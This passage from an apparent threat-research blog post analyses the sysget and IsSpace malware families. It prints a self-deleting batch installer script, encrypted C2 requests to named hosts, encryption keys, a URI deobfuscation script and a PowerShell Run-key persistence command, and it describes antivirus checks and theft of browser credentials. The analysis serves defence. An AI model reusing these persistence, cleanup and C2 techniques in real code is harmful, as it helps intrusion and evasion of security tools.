			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
@echo off
:t
timeout 1
for /f %%i in ('tasklist /FI "IMAGENAME eq [original_executable_name]" ^| find /v /c ""' ) do set YO=%%i
if %%YO%%==4 goto :t
del /F "[original_executable_path]"
del /F "[tmp_file]"
start /B cmd /c "[startup_winlogon.exe]"
del /F "[self]"
exit</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc26f873981104-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc26f873981104-2">2</div><div class="crayon-num" data-line="crayon-5f694c78cc26f873981104-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc26f873981104-4">4</div><div class="crayon-num" data-line="crayon-5f694c78cc26f873981104-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc26f873981104-6">6</div><div class="crayon-num" data-line="crayon-5f694c78cc26f873981104-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc26f873981104-8">8</div><div class="crayon-num" data-line="crayon-5f694c78cc26f873981104-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc26f873981104-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc26f873981104-1"><span class="crayon-sy">@</span><span class="crayon-e">echo </span><span class="crayon-v">off</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc26f873981104-2"><span class="crayon-o">:</span><span class="crayon-i">t</span></div><div class="crayon-line" id="crayon-5f694c78cc26f873981104-3"><span class="crayon-i">timeout</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc26f873981104-4"><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">f</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-o">%</span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">'tasklist /FI "IMAGENAME eq [original_executable_name]" ^| find /v /c ""'</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">do</span><span class="crayon-h"> </span><span class="crayon-e">set </span><span class="crayon-v">YO</span><span class="crayon-o">=</span><span class="crayon-o">%</span><span class="crayon-o">%</span><span class="crayon-i">i</span></div><div class="crayon-line" id="crayon-5f694c78cc26f873981104-5"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-o">%</span><span class="crayon-v">YO</span><span class="crayon-o">%</span><span class="crayon-o">%=</span><span class="crayon-o">=</span><span class="crayon-cn">4</span><span class="crayon-h"> </span><span class="crayon-st">goto</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-i">t</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc26f873981104-6"><span class="crayon-v">del</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">F</span><span class="crayon-h"> </span><span class="crayon-s">"[original_executable_path]"</span></div><div class="crayon-line" id="crayon-5f694c78cc26f873981104-7"><span class="crayon-v">del</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">F</span><span class="crayon-h"> </span><span class="crayon-s">"[tmp_file]"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc26f873981104-8"><span class="crayon-v">start</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">B</span><span class="crayon-h"> </span><span class="crayon-v">cmd</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">c</span><span class="crayon-h"> </span><span class="crayon-s">"[startup_winlogon.exe]"</span></div><div class="crayon-line" id="crayon-5f694c78cc26f873981104-9"><span class="crayon-v">del</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">F</span><span class="crayon-h"> </span><span class="crayon-s">"[self]"</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc26f873981104-10"><span class="crayon-v">exit</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>After installation, sysget will attempt to read the same %APPDATA%/vklCen5.tmp file as witnessed in the previous variant. A number of strings within the malware, including the ‘734thfg9ih’ key used to encrypt this file, have been obfuscated via a single-byte XOR of 0x5F.</p>
<p>Similar to previous versions, should this vklCen5.tmp file not be present on the victim machine, it will make an external HTTP request to retrieve the necessary information. The following request is made by the malware. Readers will notice that the URI has changed from previous versions in a number of ways. This version of sysget looks to always make requests to 1.php, which is hardcoded within the malware itself. Additionally, all HTTP URIs in this version of sysget are encrypted. The initial GET request made to retrieve the victim identifier and unique key is encrypted with a key of ‘Cra%hello-12sW’. The subsequent response containing this information is then decrypted using a key of ‘aliado75496’, which is consistent with previous versions.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc271515950942" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET 
/1.php?K+50lkzq7OtigRtWY7Z5DwkmxRhFd5n3UXyH+Flfa0S8f5h3nl6XBDMa6a3IbDiPQqW
SwZh7lQRmIPLlC8Wmfr8cGv7raGEV160r73FJjnOfyJPLEKWAIyJnfPZhHdGapA6tfwfwj24TN
4QbBrMJkVCLPPZoI4HNtdDEo6G3ujjyvkpWnGQnRBi6DzylNrMypV/K6Ft32dsMmmO52q4IdQ== HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/40.0.2214.115 Safari/537.36
Host: gtoimage.com</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc271515950942-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc271515950942-2">2</div><div class="crayon-num" data-line="crayon-5f694c78cc271515950942-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc271515950942-4">4</div><div class="crayon-num" data-line="crayon-5f694c78cc271515950942-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc271515950942-6">6</div><div class="crayon-num" data-line="crayon-5f694c78cc271515950942-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc271515950942-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc271515950942-1"><span class="crayon-v">GET</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc271515950942-2"><span class="crayon-o">/</span><span class="crayon-cn">1.php</span><span class="crayon-sy">?</span><span class="crayon-v">K</span><span class="crayon-o">+</span><span class="crayon-cn">50lkzq7OtigRtWY7Z5DwkmxRhFd5n3UXyH</span><span class="crayon-o">+</span><span class="crayon-e">Flfa0S8f5h3nl6XBDMa6a3IbDiPQqW</span></div><div class="crayon-line" id="crayon-5f694c78cc271515950942-3"><span class="crayon-i">SwZh7lQRmIPLlC8Wmfr8cGv7raGEV160r73FJjnOfyJPLEKWAIyJnfPZhHdGapA6tfwfwj24TN</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc271515950942-4"><span class="crayon-cn">4QbBrMJkVCLPPZoI4HNtdDEo6G3ujjyvkpWnGQnRBi6DzylNrMypV</span><span class="crayon-o">/</span><span class="crayon-v">K6Ft32dsMmmO52q4IdQ</span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-v">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line" id="crayon-5f694c78cc271515950942-5"><span class="crayon-v">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Keep</span><span class="crayon-o">-</span><span class="crayon-e">Alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc271515950942-6"><span class="crayon-v">User</span><span class="crayon-o">-</span><span class="crayon-v">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">5.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">AppleWebKit</span><span class="crayon-o">/</span><span class="crayon-cn">537.36</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">KHTML</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">like </span></div><div class="crayon-line" id="crayon-5f694c78cc271515950942-7"><span class="crayon-v">Gecko</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">Chrome</span><span class="crayon-o">/</span><span class="crayon-cn">40.0.2214.115</span><span class="crayon-h"> </span><span class="crayon-v">Safari</span><span class="crayon-o">/</span><span class="crayon-cn">537.36</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc271515950942-8"><span class="crayon-v">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">gtoimage</span><span class="crayon-sy">.</span><span class="crayon-v">com</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>When the URI above is base64-decoded and subsequently decrypted, we see the following:</p>
<p>index.php?type=read&amp;id=692fdc3c7b2c310fc017e4af335b8dc8&amp;pageinfo=jp&amp;lang=utf-8</p>
<p>This URI is consistent with the previous sysget variant. It would seem the authors simply have added this layer of encryption to hinder efforts to block the malware via network-based detections.</p>
<p>After this initial request to retrieve the victim identifier and unique key, sysget enters its command and control loop. This process is consistent with the previous version, but simply has the extra layer of encryption used for the URIs.</p>
<h3>Sysget v4 Analysis</h3>
<p>The fourth variant of sysget is nearly identical to the third variant. However, the main difference lies in the URIs used for network communication. In addition to the expected encryption of the URIs, this variant also mangles the base64 encoding that is performed afterwards. The following Python script may be used to de-obfuscate the base64 URI found in this variant:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc272112167351" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
import base64

'''
URI Request:

GET 
/5.php?62H72xihwn4LqfdOqTV4W2AthjuOeCa2k0RUvE7CicXxN2MWFre2pqH8gIdMMJQbzS0
AMo+rT4GGalhcebmCbjdrjZlyDhmUjE7QO5mIXZTAucGt3LeLXxOxGiV1G4zecHSPAX3AiAeR+
BGFsc3wtMhOWzXfithXYeCKnjh1O7pXsYqyKqfl=HpVzs4YXZb=UQY=BNEnr/77jW5JTLNI4aed
99 HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, 
like Gecko) Chrome/40.0.2214.115 Safari/537.36
Host: www.sanseitime.com
'''

uri_string = 
"62H72xihwn4LqfdOqTV4W2AthjuOeCa2k0RUvE7CicXxN2MWFre2pqH8gIdMMJQbzS0AMo+rT
4GGalhcebmCbjdrjZlyDhmUjE7QO5mIXZTAucGt3LeLXxOxGiV1G4zecHSPAX3AiAeR+BGFsc3
wtMhOWzXfithXYeCKnjh1O7pXsYqyKqfl=HpVzs4YXZb=UQY=BNEnr/77jW5JTLNI4aed99"

b64_string = 
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
prefix_int = int(uri_string[0:2])
out = ""

for u in uri_string[2:]:
	ind = b64_string.index(u) - prefix_int
	out += b64_string[ind]

decoded = base64.b64decode(out)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-2">2</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-4">4</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-6">6</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-8">8</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-10">10</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-12">12</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-14">14</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-16">16</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-18">18</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-20">20</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-22">22</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-24">24</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-26">26</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-28">28</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc272112167351-30">30</div><div class="crayon-num" data-line="crayon-5f694c78cc272112167351-31">31</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc272112167351-1"><span class="crayon-e">import </span><span class="crayon-i">base64</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-2">&nbsp;</div><div class="crayon-line" id="crayon-5f694c78cc272112167351-3"><span class="crayon-s">''</span><span class="crayon-s">'</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-4"><span class="crayon-s">URI Request:</span></div><div class="crayon-line" id="crayon-5f694c78cc272112167351-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-6"><span class="crayon-s">GET </span></div><div class="crayon-line" id="crayon-5f694c78cc272112167351-7"><span class="crayon-s">/5.php?62H72xihwn4LqfdOqTV4W2AthjuOeCa2k0RUvE7CicXxN2MWFre2pqH8gIdMMJQbzS0</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-8"><span class="crayon-s">AMo+rT4GGalhcebmCbjdrjZlyDhmUjE7QO5mIXZTAucGt3LeLXxOxGiV1G4zecHSPAX3AiAeR+</span></div><div class="crayon-line" id="crayon-5f694c78cc272112167351-9"><span class="crayon-s">BGFsc3wtMhOWzXfithXYeCKnjh1O7pXsYqyKqfl=HpVzs4YXZb=UQY=BNEnr/77jW5JTLNI4aed</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-10"><span class="crayon-s">99 HTTP/1.1</span></div><div class="crayon-line" id="crayon-5f694c78cc272112167351-11"><span class="crayon-s">Connection: Keep-Alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-12"><span class="crayon-s">User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, </span></div><div class="crayon-line" id="crayon-5f694c78cc272112167351-13"><span class="crayon-s">like Gecko) Chrome/40.0.2214.115 Safari/537.36</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-14"><span class="crayon-s">Host: www.sanseitime.com</span></div><div class="crayon-line" id="crayon-5f694c78cc272112167351-15"><span class="crayon-s">'</span><span class="crayon-s">''</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-16">&nbsp;</div><div class="crayon-line" id="crayon-5f694c78cc272112167351-17"><span class="crayon-v">uri_string</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-18"><span class="crayon-s">"62H72xihwn4LqfdOqTV4W2AthjuOeCa2k0RUvE7CicXxN2MWFre2pqH8gIdMMJQbzS0AMo+rT</span></div><div class="crayon-line" id="crayon-5f694c78cc272112167351-19"><span class="crayon-s">4GGalhcebmCbjdrjZlyDhmUjE7QO5mIXZTAucGt3LeLXxOxGiV1G4zecHSPAX3AiAeR+BGFsc3</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-20"><span class="crayon-s">wtMhOWzXfithXYeCKnjh1O7pXsYqyKqfl=HpVzs4YXZb=UQY=BNEnr/77jW5JTLNI4aed99"</span></div><div class="crayon-line" id="crayon-5f694c78cc272112167351-21">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-22"><span class="crayon-v">b64_string</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5f694c78cc272112167351-23"><span class="crayon-s">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-24"><span class="crayon-v">prefix_int</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-sy">(</span><span class="crayon-v">uri_string</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-o">:</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c78cc272112167351-25"><span class="crayon-v">out</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-26">&nbsp;</div><div class="crayon-line" id="crayon-5f694c78cc272112167351-27"><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">u</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">uri_string</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-o">:</span><span class="crayon-sy">]</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-28"><span class="crayon-h">	</span><span class="crayon-v">ind</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">b64_string</span><span class="crayon-sy">.</span><span class="crayon-e">index</span><span class="crayon-sy">(</span><span class="crayon-v">u</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-e">prefix_int</span></div><div class="crayon-line" id="crayon-5f694c78cc272112167351-29"><span class="crayon-e">	</span><span class="crayon-v">out</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-v">b64_string</span><span class="crayon-sy">[</span><span class="crayon-v">ind</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc272112167351-30">&nbsp;</div><div class="crayon-line" id="crayon-5f694c78cc272112167351-31"><span class="crayon-v">decoded</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">base64</span><span class="crayon-sy">.</span><span class="crayon-e">b64decode</span><span class="crayon-sy">(</span><span class="crayon-v">out</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0008 seconds] -->
<p>Additionally, the C2 URI changes in this variant, from 1.php to 5.php</p>
<h3>IsSpace Analysis</h3>
<p>When initially run, IsSpace will create a unique event to ensure a single instance of the malware is running at a given time. This event name appears to be unique per the sample, as multiple samples contained unique event names. The following event names have been observed in the samples that were analyzed:</p>
<ul>
<li>e6al69MS5iP</li>
<li>v485ILa3q5z</li>
</ul>
<p>IsSpace proceeds to iterate over the running processes on the system, seeking out the following two process substrings:</p>
<ul>
<li>uiSeAgnt</li>
<li>avp.exe</li>
</ul>
<p>The uiSeAgnt string may be related to Trend Micro’s solutions, while avp.exe most likely is related to Kaspersky’s anti-malware product.</p>
<p>In the event uiSeAgnt is identified, the malware will enter its installation routine if not already running as ‘bfsuc.exe’ and proceeds to exit afterwards. Should avp.exe be identified, the malware enters an infinite sleep loop until a mouse click occurs. After this takes place, the malware proceeds as normal.</p>
<p>The malware then determines if it is running under Windows XP. In the event that it is, it will make a HTTP GET request to www.bing.com, presumably to ensure network connectivity.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_9.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-23033" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_9.png" alt="dragon_9" width="974" height="83" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_9.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_9-900x77.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_9-300x26.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_9-768x65.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_9-370x32.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></a></p>
<p><em>Figure 9 IsSpace connecting to www.bing.com</em></p>
<p>If the malware is not running on Windows XP, it will attempt to obtain and decrypt any basic authentication credentials from Internet Explorer. This information is used in subsequent HTTP requests in the event a 407 (Proxy Authentication Required) or 401 (Unauthorized) response code is received during network communication.</p>
<p>IsSpace will then enter its installation routine, where it will first copy itself to the %LOCALAPPDATA% folder with a name of ‘bfsuc.exe’.  It then sets the proper registry key for persistence by executing the following PowerShell command:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc275618711335" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
C:\Windows\system32\cmd.exe /C Powershell.exe New-ItemProperty -Path 
HKCU:SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run -Name Identity -
PropertyType String -Value c:\users\josh grunzweig\appdata\local\bfsuc.exe 
-force</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc275618711335-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc275618711335-2">2</div><div class="crayon-num" data-line="crayon-5f694c78cc275618711335-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc275618711335-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc275618711335-1"><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">system32</span><span class="crayon-sy">\</span><span class="crayon-v">cmd</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">C</span><span class="crayon-h"> </span><span class="crayon-v">Powershell</span><span class="crayon-sy">.</span><span class="crayon-e">exe </span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-v">ItemProperty</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Path </span></div><div class="crayon-line crayon-striped-line" 